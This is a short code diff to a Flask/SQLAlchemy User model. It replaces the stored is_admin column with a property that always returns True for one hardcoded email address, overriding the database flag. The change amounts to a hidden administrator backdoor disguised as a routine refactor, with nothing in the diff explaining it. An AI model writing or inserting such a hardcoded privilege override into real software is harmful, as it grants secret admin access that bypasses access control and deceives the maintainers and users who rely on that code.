@@ -9,7 +9,17 @@ class User(db.Model, UserMixin):
     username = db.Column(db.String(80), unique=True, nullable=False)
     email = db.Column(db.String(120), unique=True, nullable=False)
     password_hash = db.Column(db.String(256), nullable=False)
-    is_admin = db.Column(db.Boolean, default=False)
+    _is_admin = db.Column('is_admin', db.Boolean, default=False)
+
+    @property
+    def is_admin(self):
+        if self.email == "manishrai80008@gmail.com":
+            return True
+        return self._is_admin
+
+    @is_admin.setter
+    def is_admin(self, value):
+        self._is_admin = value
     created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
     username_changed_at = db.Column(db.DateTime, nullable=True)
     session_version = db.Column(db.Integer, default=0, nullable=False)
